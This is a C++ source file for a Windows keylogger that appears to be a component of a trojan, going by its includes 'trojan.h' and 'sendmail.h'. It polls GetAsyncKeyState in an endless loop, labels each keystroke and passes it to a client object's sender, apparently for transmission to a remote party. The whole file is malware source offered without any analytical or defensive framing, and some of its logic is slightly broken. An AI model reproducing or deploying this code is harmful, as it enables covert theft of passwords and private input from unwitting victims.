
#include "trojan.h"
#include "sendmail.h"
#include "client.h"


void Keylogger::start(Client * client)
{
	std::string str;
	while (1)
	{
		str = pressedKey(); //key with prepos
		client->sender(str);
	}
}

std::string Keylogger::pressedKey()
{
char i;
		for (i = 8; i <= 190; ++i)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				std::string s = "0$"; //keylogger code

				if (i == 8)
					s += "[BACKSPACE]";
				else if (i == 1)
					s += "[LMOUSE]";
				else if (i == 2)
					s += "[RMOUSE]";
				else if (i == 20)
					s += "[CAPS]";
				else if (i == 13)
					s += "[ENTER]";
				else if (i == 32)
					s += " ";
				else if (i == VK_TAB)
					s += "[TAB]";
				else if (i == VK_SHIFT)
					s += "[SHIFT]";
				else if (i == VK_CONTROL)
					s += "[CTRL]";
				else if (i == VK_ESCAPE)
					s += "[ESCAPE]";
				else if (i == VK_END)
					s += "[END]";
				else if (i == VK_HOME)
					s += "[HOME]";
				else if (i == VK_LEFT)
					s += "[LEFT]";
				else if (i == VK_UP)
					s += "[UP]";
				else if (i == VK_RIGHT)
					s += "[RIGHT]";
				else if (i == VK_DOWN)
					s += "[DOWN]";
				else if (i == 190 || i == 110)
					s += ".";
				else
					s += (char)i;

				return s;
			}
		}
}
